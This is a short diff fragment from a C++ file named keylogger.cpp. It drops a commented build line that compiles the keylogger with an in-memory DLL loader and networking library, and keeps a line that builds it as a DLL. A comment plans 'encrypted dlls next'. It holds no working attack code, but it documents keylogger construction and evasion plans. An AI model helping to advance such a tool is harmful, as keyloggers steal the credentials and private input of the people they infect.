@@ -1,4 +1,3 @@
-//cl /EHsc .\keylogger.cpp .\MemoryModule.c /link ws2_32.lib user32.lib /OUT:keylogger.exe
 //cl /EHsc /LD .\keylogger.cpp /link user32.lib
 /*
     use encrypted dlls next
